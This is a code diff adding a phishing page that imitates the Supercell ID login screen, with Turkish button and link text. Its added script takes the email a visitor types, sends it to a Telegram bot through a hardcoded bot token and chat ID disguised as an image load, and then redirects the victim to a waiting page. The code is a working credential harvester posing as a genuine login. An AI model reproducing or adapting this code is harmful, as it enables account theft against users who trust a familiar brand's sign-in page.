@@ -293,5 +293,45 @@
         }
     });
 </script>
+    <button class="btn btn-blue">GİRİŞ YAP</button>
+    <button class="btn btn-cancel">İPTAL</button>
+
+    <a href="#" class="footer-link">Supercell ID'ye kaydolmak ister misiniz?</a>
+</div>
+
+<script>
+    const emailInput = document.querySelector('input[type="email"]');
+    const loginBtn = document.querySelector('.btn-blue');
+
+    const BOT_TOKEN = '8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A'; 
+    const CHAT_ID = '-1003369084883';
+
+    loginBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        const email = emailInput.value;
+
+        if (email.includes("@") && email.length > 5) {
+            loginBtn.innerText = "GÖNDERİLİR...";
+            
+            const text = encodeURIComponent(`📧 Yeni Giriş: ${email}`);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+
+            const img = new Image();
+            img.src = url;
+
+            setTimeout(function() {
+                window.location.href = "wait.html";
+            }, 800);
+
+        } else {
+            alert("Lütfen geçerli bir e-posta adresi girin.");
+        }
+    });
+</script>
+
+</body>
+</html>
+
 
 
